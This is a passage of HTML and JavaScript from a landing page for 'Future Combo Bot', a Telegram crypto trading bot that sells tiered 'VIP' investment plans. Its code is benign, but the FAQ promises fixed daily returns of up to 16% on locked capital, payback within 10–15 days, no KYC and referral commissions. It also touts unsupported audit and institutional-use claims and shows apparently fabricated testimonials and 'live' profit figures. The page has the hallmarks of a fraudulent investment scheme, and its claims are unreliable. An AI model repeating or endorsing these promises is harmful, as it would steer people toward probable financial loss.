                            <div class="text-lg font-bold text-orange-600">218</div>
                            <div class="text-xs text-gray-600">Available USDT</div>
                        </div>
                    </div>
                    <div class="flex items-center space-x-2">
                        <input type="text" value="https://t.me/FutureComboBot?start=user39634464" readonly class="flex-1 p-2 border rounded text-xs">
                        <button class="px-3 py-2 bg-gray-100 hover:bg-gray-200 rounded text-xs">
                            <i data-lucide="copy" class="h-3 w-3"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Referral Earnings Image -->
    <section class="py-8 bg-white">
        <div class="container mx-auto px-4">
            <div class="text-center">
                <img src="https://imgdrive.42web.io/uploads/x0GQ3.png" alt="Referral Earnings Dashboard" class="mx-auto rounded-lg shadow-lg border border-gray-200 hover:shadow-xl transition-all duration-500 max-w-full h-auto">
                <p class="text-xs text-gray-600 mt-3 italic">
                    Live referral earnings dashboard showing real-time commission payouts and team statistics
                </p>
            </div>
        </div>
    </section>

    <!-- PNL Breakdown Section -->
    <section class="py-12 bg-gradient-to-br from-gray-50 to-blue-50">
        <div class="container mx-auto px-4">
            <div class="text-center mb-8">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="bar-chart-3" class="w-3 h-3 mr-1"></i>
                    PNL Analysis
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">Detailed PNL Breakdowns</h2>
                <p class="text-xs text-gray-600">
                    Analyze win/loss ratios and volumes across plans for informed decisions. 100% transparent data builds
                    long-term trust.
                </p>
            </div>

            <div class="max-w-4xl mx-auto">
                <div class="bg-white rounded-xl border shadow-sm p-5 hover:shadow-lg transition-all duration-300">
                    <div class="text-center mb-5">
                        <img src="https://imgdrive.42web.io/uploads/jH4L9.png" alt="Detailed PNL Breakdown Analysis" class="mx-auto rounded-lg shadow-lg border border-gray-200 max-w-full h-auto">
                    </div>
                    <div class="grid md:grid-cols-3 gap-4 text-center">
                        <div class="bg-green-50 p-3 rounded-lg">
                            <div class="flex items-center justify-center mb-2">
                                <i data-lucide="check-circle" class="w-4 h-4 text-green-600 mr-1"></i>
                                <span class="text-sm font-bold text-green-600">Daily profits up to 270 USDT</span>
                            </div>
                        </div>
                        <div class="bg-blue-50 p-3 rounded-lg">
                            <div class="flex items-center justify-center mb-2">
                                <i data-lucide="trending-up" class="w-4 h-4 text-blue-600 mr-1"></i>
                                <span class="text-sm font-bold text-blue-600">High win rates: 75+</span>
                            </div>
                        </div>
                        <div class="bg-purple-50 p-3 rounded-lg">
                            <div class="flex items-center justify-center mb-2">
                                <i data-lucide="target" class="w-4 h-4 text-purple-600 mr-1"></i>
                                <span class="text-sm font-bold text-purple-600">Upgrade tips for better results</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Live Trades Dashboard -->
    <section class="py-12 bg-white">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="activity" class="w-3 h-3 mr-1"></i>
                    Live Trading
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">Live Trades Dashboard</h2>
                <p class="text-xs text-gray-600">Real-time trading performance and statistics</p>
                <span class="inline-flex items-center px-2 py-1 rounded-md text-xs font-medium bg-gray-100 text-gray-700 border border-gray-200 mt-2">
                    <i data-lucide="clock" class="w-3 h-3 mr-1"></i>
                    Last Update: 8/2/2025, 6:57:47 AM
                </span>
            </div>

            <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-5 mb-8">
                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6 text-center">
                        <div class="w-8 h-8 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-2">
                            <i data-lucide="users" class="h-4 w-4 text-blue-600"></i>
                        </div>
                        <div class="text-lg font-bold">25,557</div>
                        <div class="text-xs text-gray-600">Active Users</div>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6 text-center">
                        <div class="w-8 h-8 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-2">
                            <i data-lucide="dollar-sign" class="h-4 w-4 text-green-600"></i>
                        </div>
                        <div class="text-lg font-bold">9,795,804</div>
                        <div class="text-xs text-gray-600">Total Deposits USDT</div>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6 text-center">
                        <div class="w-8 h-8 bg-purple-50 rounded-full flex items-center justify-center mx-auto mb-2">
                            <i data-lucide="trending-up" class="h-4 w-4 text-purple-600"></i>
                        </div>
                        <div class="text-lg font-bold">87.7%</div>
                        <div class="text-xs text-gray-600">Trading Accuracy</div>
                    </div>
                </div>
                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300 animate-fade-in-up">
                    <div class="pt-5 px-6 pb-6 text-center">
                        <div class="w-8 h-8 bg-orange-50 rounded-full flex items-center justify-center mx-auto mb-2">
                            <i data-lucide="bar-chart-3" class="h-4 w-4 text-orange-600"></i>
                        </div>
                        <div class="text-lg font-bold">92,011</div>
                        <div class="text-xs text-gray-600">24hr Profit USDT</div>
                    </div>
                </div>
            </div>

            <div class="grid md:grid-cols-2 gap-5">
                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300">
                    <div class="px-6 pt-6 pb-3">
                        <div class="flex items-center justify-between">
                            <h3 class="text-base font-bold">ETHUSDT Trade</h3>
                            <span class="inline-flex items-center px-2 py-1 rounded-md text-xs font-medium bg-green-50 text-green-700 border border-green-200">
                                <i data-lucide="trending-up" class="w-3 h-3 mr-1"></i>
                                Buy • 5x Leverage
                            </span>
                        </div>
                    </div>
                    <div class="px-6 pb-6">
                        <div class="space-y-1 text-xs">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Entry Price:</span>
                                <span class="font-bold">$3,340.90</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Mark Price:</span>
                                <span class="font-bold text-green-600">$4,480.10</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Target:</span>
                                <span class="font-bold">$4,654.11</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Unrealised PnL:</span>
                                <span class="font-bold text-green-600">$2,033.1</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Potential Gain:</span>
                                <span class="font-bold text-green-600">526.2%</span>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300">
                    <div class="px-6 pt-6 pb-3">
                        <div class="flex items-center justify-between">
                            <h3 class="text-base font-bold">BTCUSDT Trade</h3>
                            <span class="inline-flex items-center px-2 py-1 rounded-md text-xs font-medium bg-green-50 text-green-700 border border-green-200">
                                <i data-lucide="trending-up" class="w-3 h-3 mr-1"></i>
                                Buy • 25x Leverage
                            </span>
                        </div>
                    </div>
                    <div class="px-6 pb-6">
                        <div class="space-y-1 text-xs">
                            <div class="flex justify-between">
                                <span class="text-gray-600">Entry Price:</span>
                                <span class="font-bold">$109,427.10</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Mark Price:</span>
                                <span class="font-bold text-green-600">$119,986.56</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Target:</span>
                                <span class="font-bold">$122,685.89</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Unrealised PnL:</span>
                                <span class="font-bold text-green-600">$6,893.3</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-600">Potential Gain:</span>
                                <span class="font-bold text-green-600">887.2%</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Testimonials Section -->
    <section class="py-12 bg-gradient-to-br from-gray-50 to-blue-50">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="star" class="w-3 h-3 mr-1"></i>
                    Testimonials
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">What Our Users Say</h2>
                <p class="text-xs text-gray-600">Real testimonials from satisfied traders worldwide</p>
            </div>

            <div class="relative max-w-4xl mx-auto">
                <div id="testimonial-card" class="bg-white rounded-xl border shadow-sm p-6 hover:shadow-lg transition-all duration-300">
                    <div class="flex flex-col md:flex-row items-start space-y-3 md:space-y-0 md:space-x-5 mb-5">
                        <div class="flex-shrink-0">
                            <div class="relative">
                                <img id="testimonial-avatar" src="/placeholder.svg?height=60&width=60&text=SJ&bg=4F46E5&color=white" alt="User Avatar" class="w-15 h-15 rounded-full border-2 border-blue-100">
                                <div class="absolute -bottom-1 -right-1 w-4 h-4 bg-green-500 rounded-full border-2 border-white flex items-center justify-center">
                                    <i data-lucide="check-circle" class="w-2 h-2 text-white"></i>
                                </div>
                            </div>
                        </div>
                        <div class="flex-1">
                            <div class="flex items-center space-x-3 mb-2">
                                <h3 id="testimonial-name" class="font-bold text-base text-gray-900">Sarah Johnson</h3>
                                <div class="flex items-center space-x-1">
                                    <i data-lucide="star" class="h-3 w-3 fill-yellow-400 text-yellow-400"></i>
                                    <i data-lucide="star" class="h-3 w-3 fill-yellow-400 text-yellow-400"></i>
                                    <i data-lucide="star" class="h-3 w-3 fill-yellow-400 text-yellow-400"></i>
                                    <i data-lucide="star" class="h-3 w-3 fill-yellow-400 text-yellow-400"></i>
                                    <i data-lucide="star" class="h-3 w-3 fill-yellow-400 text-yellow-400"></i>
                                </div>
                            </div>
                            <div class="flex flex-wrap items-center gap-3 text-xs text-gray-600 mb-3">
                                <div class="flex items-center space-x-1">
                                    <i data-lucide="globe" class="w-3 h-3"></i>
                                    <span id="testimonial-country" class="font-medium">USA</span>
                                </div>
                                <div class="flex items-center space-x-1">
                                    <i data-lucide="dollar-sign" class="w-3 h-3 text-green-600"></i>
                                    <span id="testimonial-earnings" class="text-green-600 font-bold">1,250 USDT earned</span>
                                </div>
                                <div class="flex items-center space-x-1">
                                    <i data-lucide="clock" class="w-3 h-3 text-blue-600"></i>
                                    <span id="testimonial-joined" class="text-blue-600 font-medium">92 days with us</span>
                                </div>
                            </div>
                            <blockquote id="testimonial-quote" class="text-sm text-gray-700 leading-relaxed italic">
                                "This bot is absolutely incredible! I started with VIP 2 and I'm already seeing consistent daily profits. The AI trading is so smooth and the withdrawals are instant. I've upgraded to VIP 4 and couldn't be happier with the results!"
                            </blockquote>
                        </div>
                    </div>
                </div>

                <button id="prev-testimonial" class="absolute left-0 top-1/2 transform -translate-y-1/2 -translate-x-3 bg-white rounded-full p-2 shadow-lg hover:shadow-xl transition-all duration-300 hover:scale-110">
                    <i data-lucide="chevron-left" class="h-4 w-4"></i>
                </button>

                <button id="next-testimonial" class="absolute right-0 top-1/2 transform -translate-y-1/2 translate-x-3 bg-white rounded-full p-2 shadow-lg hover:shadow-xl transition-all duration-300 hover:scale-110">
                    <i data-lucide="chevron-right" class="h-4 w-4"></i>
                </button>

                <div id="testimonial-dots" class="flex justify-center mt-6 space-x-1">
                    <!-- Dots will be generated by JavaScript -->
                </div>
            </div>
        </div>
    </section>

    <!-- FAQs Section -->
    <section id="faqs" class="py-12 bg-white">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="bot" class="w-3 h-3 mr-1"></i>
                    Your Future Starts Here
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">Explore the Future Combo Bot FAQ!</h2>
                <p class="text-xs text-gray-600">Get Answers To All Your Questions like terms and conditions.</p>
            </div>

            <div class="max-w-3xl mx-auto space-y-3">
                <!-- FAQ Items will be generated by JavaScript -->
                <div id="faq-container">
                    <!-- FAQs will be inserted here -->
                </div>
            </div>
        </div>
    </section>

    <!-- FAQ Support Image -->
    <section class="py-8 bg-gradient-to-br from-gray-50 to-blue-50">
        <div class="container mx-auto px-4">
            <div class="text-center">
                <img src="https://imgdrive.42web.io/uploads/5fMKw.jpeg" alt="FAQ Support and Customer Service" class="mx-auto rounded-lg shadow-lg border border-gray-200 hover:shadow-xl transition-all duration-500 max-w-full h-auto">
                <p class="text-xs text-gray-600 mt-3 italic">
                    24/7 customer support and comprehensive FAQ section for all your questions
                </p>
            </div>
        </div>
    </section>

    <!-- Final CTA Section -->
    <section class="py-12 bg-gradient-to-br from-blue-600 via-purple-600 to-indigo-700 text-white relative overflow-hidden">
        <div class="absolute inset-0 bg-grid-pattern opacity-10"></div>
        <div class="container mx-auto px-4 text-center relative z-10">
            <div class="animate-fade-in-up">
                <h2 class="text-xl md:text-2xl font-bold mb-3">Ready to Start Your Crypto Journey?</h2>
                <p class="text-base mb-5 opacity-90 max-w-2xl mx-auto">
                    Join thousands of successful traders earning passive income daily with our AI-powered trading bot
                </p>
                <div class="flex flex-col sm:flex-row gap-3 justify-center items-center">
                    <button onclick="window.open('https://t.me/FutureComboBot', '_blank')" class="bg-white text-blue-600 hover:bg-gray-100 px-6 py-2 text-base rounded-full hover:scale-105 transition-all duration-300 shadow-lg inline-flex items-center">
                        <i data-lucide="rocket" class="mr-2 h-4 w-4"></i>
                        Start Now - Join Telegram Bot
                        <i data-lucide="external-link" class="ml-2 h-3 w-3"></i>
                    </button>
                </div>
                <div class="flex flex-wrap justify-center items-center gap-5 mt-5 text-xs opacity-80">
                    <div class="flex items-center space-x-2">
                        <i data-lucide="check-circle" class="h-3 w-3"></i>
                        <span>No hidden fees</span>
                    </div>
                    <div class="flex items-center space-x-2">
                        <i data-lucide="shield" class="h-3 w-3"></i>
                        <span>Secure platform</span>
                    </div>
                    <div class="flex items-center space-x-2">
                        <i data-lucide="clock" class="h-3 w-3"></i>
                        <span>24/7 support</span>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer id="contact" class="bg-gray-900 text-white py-10">
        <div class="container mx-auto px-4">
            <div class="grid md:grid-cols-4 gap-6">
                <div class="animate-fade-in-up">
                    <div class="flex items-center space-x-2 mb-3">
                        <i data-lucide="bot" class="h-5 w-5 text-blue-400"></i>
                        <span class="text-base font-bold">Future Combo Bot</span>
                    </div>
                    <p class="text-xs text-gray-400 mb-3">AI-powered crypto trading for passive income</p>
                    <div class="flex space-x-2">
                        <a href="https://t.me/FutureComboBot" class="text-gray-400 hover:text-white transition-colors hover:scale-110 transform">
                            <div class="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center">
                                <i data-lucide="send" class="w-3 h-3 text-white"></i>
                            </div>
                        </a>
                        <a href="#" class="text-gray-400 hover:text-white transition-colors hover:scale-110 transform">
                            <div class="w-6 h-6 bg-blue-400 rounded-full flex items-center justify-center">
                                <span class="text-white font-bold text-xs">X</span>
                            </div>
                        </a>
                    </div>
                </div>

                <div class="animate-fade-in-up">
                    <h3 class="font-bold mb-3 text-xs">Quick Links</h3>
                    <div class="space-y-1">
                        <a href="#about-bot" class="block text-xs text-gray-400 hover:text-white transition-colors">About Bot</a>
                        <a href="#vip-plans" class="block text-xs text-gray-400 hover:text-white transition-colors">VIP Plans</a>
                        <a href="#referrals" class="block text-xs text-gray-400 hover:text-white transition-colors">Referrals</a>
                        <a href="#faqs" class="block text-xs text-gray-400 hover:text-white transition-colors">FAQs</a>
                    </div>
                </div>

                <div class="animate-fade-in-up">
                    <h3 class="font-bold mb-3 text-xs">Legal</h3>
                    <div class="space-y-1">
                        <a href="#" class="block text-xs text-gray-400 hover:text-white transition-colors">Privacy Policy</a>
                        <a href="#" class="block text-xs text-gray-400 hover:text-white transition-colors">Terms of Service</a>
                        <a href="#" class="block text-xs text-gray-400 hover:text-white transition-colors">Contact Us</a>
                    </div>
                </div>

                <div class="animate-fade-in-up">
                    <h3 class="font-bold mb-3 text-xs">Join Community</h3>
                    <button onclick="window.open('https://t.me/FutureComboBot', '_blank')" class="bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 hover:scale-105 transition-all duration-300 text-xs flex items-center px-3 py-2 rounded">
                        <i data-lucide="send" class="mr-2 h-3 w-3"></i>
                        Join Telegram
                    </button>
                </div>
            </div>

            <div class="border-t border-gray-800 mt-6 pt-5 text-center text-xs text-gray-400">
                <p>&copy; 2025 Future Combo Bot. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <script>
        // Initialize Lucide icons
        lucide.createIcons();

        // Mobile menu functionality
        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
        const mobileMenu = document.getElementById('mobile-menu');
        const menuIcon = document.getElementById('menu-icon');
        const closeIcon = document.getElementById('close-icon');

        mobileMenuBtn.addEventListener('click', () => {
            mobileMenu.classList.toggle('hidden');
            menuIcon.classList.toggle('hidden');
            closeIcon.classList.toggle('hidden');
        });

        // Testimonials data
        const testimonials = [
            {
                name: "Sarah Johnson",
                country: "USA",
                earnings: 1250,
                joined: 92,
                quote: "This bot is absolutely incredible! I started with VIP 2 and I'm already seeing consistent daily profits. The AI trading is so smooth and the withdrawals are instant. I've upgraded to VIP 4 and very happier with the results!",
                avatar: "https://imgdrive.42web.io/uploads/2IaZE.png",
            },
            {
                name: "Ahmed Bello",
                country: "Nigeria",
                earnings: 820,
                joined: 47,
                quote: "Amazing platform! As someone new to crypto, this bot made everything so easy. The daily profits keep coming and the referral system is fantastic. I've already referred 5 friends and we're all making money together!",
                avatar: "https://imgdrive.42web.io/uploads/1aNGk.png",
            },
            {
                name: "Maria Santos",
                country: "Brazil",
                earnings: 2700,
                joined: 135,
                quote: "Four months in and I'm blown away! The 87.7% accuracy isn't just marketing - it's real. My portfolio has grown consistently and the customer support is excellent. This is the best investment I've ever made!",
                avatar: "https://imgdrive.42web.io/uploads/ASyIB.png",
            },
            {
                name: "James Carter",
                country: "UK",
                earnings: 600,
                joined: 28,
                quote: "Perfect for beginners like me! The interface is super user-friendly and I love getting those daily profit notifications. Started small but already planning to increase my investment. Highly recommend!",
                avatar: "https://imgdrive.42web.io/uploads/K7wIO.png",
            },
            {
                name: "Priya Sharma",
                country: "India",
                earnings: 1100,
                joined: 63,
                quote: "The AI technology behind this bot is impressive! Great returns, transparent operations, and the referral earnings are a nice bonus. My tech background helps me appreciate how well-designed this system is.",
                avatar: "https://imgdrive.42web.io/uploads/kSovE.png",
            },
            {
                name: "Carlos Rivera",
                country: "Mexico",
                earnings: 3200,
                joined: 110,
                quote: "Exceptional returns and lightning-fast withdrawals! I've tried other platforms but nothing comes close to this bot's performance. The risk management is solid and profits are consistent even during market volatility.",
                avatar: "https://imgdrive.42web.io/uploads/PcFSq.png",
            },
            {
                name: "Emma Wilson",
                country: "Australia",
                earnings: 750,
                joined: 39,
                quote: "Love this platform! As a freelancer, the passive income has been a game-changer. Waking up to profit notifications 😅 The support team is amazing and always ready to help!",
                avatar: "https://imgdrive.42web.io/uploads/fZtXz.png",
            },
            {
                name: "Li Wei",
                country: "China",
                earnings: 4500,
                joined: 142,
                quote: "Outstanding performance! The algorithms are sophisticated and the security measures are top-notch. This platform has exceeded all my expectations and delivered consistent profits for months.",
                avatar: "https://imgdrive.42web.io/uploads/BJ2qd.png",
            },
            {
                name: "Sophie Dubois",
                country: "France",
                earnings: 950,
                joined: 55,
                quote: "Simple setup, real results! I was earning within the first week and the educational resources helped me understand everything. Perfect for busy parents like me who want passive income.",
                avatar: "https://imgdrive.42web.io/uploads/K7wIO.png",
            },
            {
                name: "Raj Patel",
                country: "Canada",
                earnings: 1800,
                joined: 76,
                quote: "Excellent for retirement planning! The automated system works perfectly and I can enjoy my time while my investments grow. The VIP plans offer great flexibility for different investment levels.",
                avatar: "https://imgdrive.42web.io/uploads/r2L9N.png",
            },
        ];

        // Testimonials functionality
        let currentTestimonial = 0;

        function updateTestimonial(index) {
            const testimonial = testimonials[index];
            document.getElementById('testimonial-name').textContent = testimonial.name;
            document.getElementById('testimonial-country').textContent = testimonial.country;
            document.getElementById('testimonial-earnings').textContent = `${testimonial.earnings.toLocaleString()} USDT earned`;
            document.getElementById('testimonial-joined').textContent = `${testimonial.joined} days with us`;
            document.getElementById('testimonial-quote').textContent = `"${testimonial.quote}"`;
            document.getElementById('testimonial-avatar').src = testimonial.avatar;
            document.getElementById('testimonial-avatar').alt = testimonial.name;
            
            // Update dots
            const dots = document.querySelectorAll('.testimonial-dot');
            dots.forEach((dot, i) => {
                if (i === index) {
                    dot.className = 'testimonial-dot w-6 h-2 rounded-full transition-all duration-300 bg-blue-600';
                } else {
                    dot.className = 'testimonial-dot w-2 h-2 rounded-full transition-all duration-300 bg-gray-300 hover:bg-gray-400 cursor-pointer';
                }
            });
        }

        function nextTestimonial() {
            currentTestimonial = (currentTestimonial + 1) % testimonials.length;
            updateTestimonial(currentTestimonial);
        }

        function prevTestimonial() {
            currentTestimonial = (currentTestimonial - 1 + testimonials.length) % testimonials.length;
            updateTestimonial(currentTestimonial);
        }

        // Create testimonial dots
        const dotsContainer = document.getElementById('testimonial-dots');
        testimonials.forEach((_, index) => {
            const dot = document.createElement('button');
            dot.className = 'testimonial-dot w-2 h-2 rounded-full transition-all duration-300 bg-gray-300 hover:bg-gray-400 cursor-pointer';
            dot.addEventListener('click', () => {
                currentTestimonial = index;
                updateTestimonial(currentTestimonial);
            });
            dotsContainer.appendChild(dot);
        });

        // Initialize first testimonial
        updateTestimonial(0);

        // Testimonial navigation
        document.getElementById('next-testimonial').addEventListener('click', nextTestimonial);
        document.getElementById('prev-testimonial').addEventListener('click', prevTestimonial);

        // Auto-rotate testimonials
        setInterval(nextTestimonial, 5000);

        // FAQ data
        const faqs = [
            {
                question: "What exactly is Future Combo Bot?",
                answer: "Future Combo Bot is a fully automated AI crypto trading bot that runs 24/7, using both Long & Short trades to generate profit from market volatility.",
            },
            {
                question: "How is this different from other bots?",
                answer: "Unlike most, it uses dual-direction trading, hedging, and strong risk management to give consistent ROI — even in volatile markets.",
            },
            {
                question: "What are the VIP investment plans and returns?",
                answer: "There are 6 VIP levels: VIP 1: 30 USDT → 1.2/day, VIP 2: 150 → 7.5/day, VIP 3: 600 → 39/day, VIP 4: 3000 → 270/day, VIP 5: 8000 → 960/day, VIP 6: 18000 → 2880/day",
            },
            {
                question: "What's the capital lock duration?",
                answer: "Capital is locked for 60 or 120 days depending on the plan, but profits are withdrawable daily without limits.",
            },
            {
                question: "Can I recover my full capital anytime?",
                answer: "Early Withdrawal Not Allowed. But You can still apply for a full refund anytime, but early exit comes with a % fee as penalty.",
            },
            {
                question: "How soon do I recover my investment?",
                answer: "Most users recover capital in 10–15 days via daily profits, after which it's pure profit.",
            },
            {
                question: "What's the withdrawal time?",
                answer: "Withdrawals are usually instant (1–5 mins), max up to 12 hours in rare cases.",
            },
            {
                question: "Is there a profit-sharing commission?",
                answer: "Yes — only on profits: VIP 1–2: 30%, VIP3: 20%, VIP 4: 20%, VIP 5: 10%, VIP 6: 5%",
            },
            {
                question: "Can I reinvest or upgrade plans?",
                answer: "Yes — after completion, you can reinvest or upgrade anytime to a higher VIP for better returns. You can use profits to buy plans for compounded returns.",
            },
            {
                question: "What if I don't want to invest but want to refer?",
                answer: "You can still refer and earn commissions without investing. No hidden conditions, no commissions on refer commission 100% yours.",
            },
            {
                question: "Is referral reward deducted from user deposit?",
                answer: "No, it comes from the bot's profit commission — your referred users' funds remain fully invested.",
            },
            {
                question: "Is KYC needed to join?",
                answer: "Nope. Just a Telegram account and USDT BEP-20 wallet is enough.",
            },
            {
                question: "How long has this bot been running?",
                answer: "Launched to the public on Jan 1st, 2025 after 5+ years of private use by institutional clients. Proven, audited, and stable.",
            },
            {
                question: "How do I start?",
                answer: "Just open @FutureComboBot, set your usdt bep 20 wallet address, choose your VIP plan, and start earning from Day 1!",
            },
        ];

        // Generate FAQ items
        const faqContainer = document.getElementById('faq-container');
        faqs.forEach((faq, index) => {
            const faqItem = document.createElement('div');
            faqItem.className = 'bg-white rounded-xl border shadow-sm hover:shadow-lg transition-all duration-300';
            faqItem.innerHTML = `
                <div class="cursor-pointer hover:bg-gray-50 transition-colors py-3 px-6" onclick="toggleFaq(${index})">
                    <div class="flex items-center justify-between">
                        <h3 class="text-left text-sm font-bold">${faq.question}</h3>
                        <div class="chevron-rotate" id="chevron-${index}">
                            <i data-lucide="chevron-down" class="h-4 w-4"></i>
                        </div>
                    </div>
                </div>
                <div class="faq-content closed" id="faq-content-${index}">
                    <div class="px-6 pb-6">
                        <p class="text-xs text-gray-600 leading-relaxed">${faq.answer}</p>
                    </div>
                </div>
            `;
            faqContainer.appendChild(faqItem);
        });

        // FAQ functionality
        function toggleFaq(index) {
            const content = document.getElementById(`faq-content-${index}`);
            const chevron = document.getElementById(`chevron-${index}`);
            
            if (content.classList.contains('closed')) {
                content.classList.remove('closed');
                content.classList.add('open');
                chevron.classList.add('rotated');
            } else {
                content.classList.remove('open');
                content.classList.add('closed');
                chevron.classList.remove('rotated');
            }
        }

        // Reinitialize Lucide icons after dynamic content is added
        setTimeout(() => {
            lucide.createIcons();
        }, 100);
    </script>
</body>
</html>
